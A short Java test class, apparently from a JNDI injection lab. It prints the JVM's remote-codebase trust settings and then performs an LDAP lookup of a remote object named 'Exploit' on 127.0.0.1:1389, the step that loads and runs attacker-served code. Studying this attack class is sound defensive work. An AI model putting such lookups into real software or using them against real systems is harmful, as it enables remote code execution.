package com.jndi;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.util.Hashtable;

public class LdapJndiTest {
    public static void main(String args[]) throws Exception{


        System.out.println("java.rmi.server.codebase:"+System.getProperty("java.rmi.server.codebase"));
        System.out.println("java.rmi.server.useCodebaseOnly:"+System.getProperty("java.rmi.server.useCodebaseOnly"));
        System.out.println("com.sun.jndi.rmi.object.trustURLCodebase:"+System.getProperty("com.sun.jndi.rmi.object.trustURLCodebase"));
        System.out.println("com.sun.jndi.cosnaming.object.trustURLCodebase:"+System.getProperty("com.sun.jndi.cosnaming.object.trustURLCodebase"));
        System.out.println("com.sun.jndi.ldap.object.trustURLCodebase:"+System.getProperty("com.sun.jndi.ldap.object.trustURLCodebase"));

        /**
         * Test1: JNDI Lookup
         */
        Hashtable env = new Hashtable();
        Context ctx = new InitialContext(env);
        Object local_obj = ctx.lookup("ldap://127.0.0.1:1389/Exploit");
    }
}
